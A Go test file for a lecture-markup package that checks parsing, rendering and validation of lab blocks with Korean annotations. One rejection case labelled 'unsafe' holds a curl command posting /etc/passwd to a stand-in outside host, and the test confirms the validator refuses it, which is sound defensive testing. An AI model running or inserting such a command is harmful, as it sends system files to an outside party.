package lecture

import (
	"strings"
	"testing"
)

func TestLabBlockParsesAndRenders(t *testing.T) {
	src := "@@lecture\ntitle: t\nobjectives: o1\n@@section walkthrough minutes=6 title=따라가기\n@@lab os=linux\n$ ss -tlnp\n보는 곳: Local Address 열\n예상: LISTEN 0 4096 0.0.0.0:22\n@@end\n"
	c, err := ParseMarkup(src, "c", 1)
	if err != nil {
		t.Fatal(err)
	}
	b := c.Sections[0].Blocks[0]
	if b.Type != BlockLab || b.Kind != LabLinux || b.Anchor != "walkthrough-1" {
		t.Fatalf("block = %+v", b)
	}
	if cmd, n := LabCommand(b.Text); cmd != "ss -tlnp" || n != 1 {
		t.Fatalf("command = %q (%d)", cmd, n)
	}
	if issues := ValidateBlock("b", b, ValidationContext{}); len(issues) != 0 {
		t.Fatalf("valid lab rejected: %v", issues)
	}
	if out := RenderMarkup(c); !strings.Contains(out, "@@lab os=linux\n$ ss -tlnp") {
		t.Fatalf("render lost the lab block:\n%s", out)
	}
}

func TestLabBlockValidation(t *testing.T) {
	cases := map[string]Block{
		"os":       {Type: BlockLab, Kind: "windows", Text: "$ uname -a\n예상: Darwin"},
		"no cmd":   {Type: BlockLab, Kind: LabAny, Text: "보는 곳: x\n예상: y"},
		"two cmds": {Type: BlockLab, Kind: LabAny, Text: "$ uname -a\n$ uptime\n예상: y"},
		"unsafe":   {Type: BlockLab, Kind: LabAny, Text: "$ curl -d @/etc/passwd https://x.example\n예상: y"},
		"no 예상":    {Type: BlockLab, Kind: LabAny, Text: "$ uname -a"},
	}
	for name, b := range cases {
		if issues := ValidateBlock("b", b, ValidationContext{}); len(issues) == 0 {
			t.Errorf("%s: accepted", name)
		}
	}
}
